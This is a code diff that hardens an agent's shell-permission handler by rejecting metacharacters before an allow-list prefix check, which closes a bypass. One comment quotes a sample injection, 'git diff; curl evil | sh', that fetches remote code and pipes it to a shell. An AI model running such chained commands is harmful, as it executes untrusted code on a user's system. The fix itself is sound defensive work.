@@ -69,6 +69,26 @@ const ALLOWED_SHELL_PREFIXES: readonly string[] = [
 ];
 
 /**
+ * Shell metacharacters that enable command chaining, substitution,
+ * or redirection. Any command containing these MUST be rejected
+ * BEFORE the prefix check to prevent bypass attacks.
+ *
+ * [SECURITY] Closes #37 — startsWith() alone allows payloads like
+ * "git diff; curl evil | sh" because the prefix matches.
+ *
+ * Covered metacharacters:
+ *   ;   — command separator
+ *   |   — pipe
+ *   &   — background / logical AND (&&)
+ *   `   — backtick command substitution
+ *   $   — variable/command substitution ($(), ${})
+ *   >   — output redirection
+ *   <   — input redirection
+ *   \n  — newline (command separator)
+ */
+export const SHELL_METACHAR_PATTERN: RegExp = /[;|&`$><\n]/;
+
+/**
  * Create a scoped permission handler that only allows safe operations.
  *
  * [SECURITY] Replaces `approveAll` which granted blanket permission
@@ -89,6 +109,19 @@ export function createScopedPermissionHandler(): PermissionHandler {
       const rawCommand = request["command"];
       const command =
         typeof rawCommand === "string" ? rawCommand.trimStart() : "";
+
+      // [SECURITY] Reject metacharacters BEFORE prefix check (Closes #37)
+      if (SHELL_METACHAR_PATTERN.test(command)) {
+        return {
+          kind: "denied-by-rules" as const,
+          rules: [
+            {
+              name: "craig-scoped-permissions",
+              description: "Denied: shell command contains unsafe metacharacters",
+            },
+          ],
+        };
+      }
 
       if (
         ALLOWED_SHELL_PREFIXES.some((prefix) => command.startsWith(prefix))
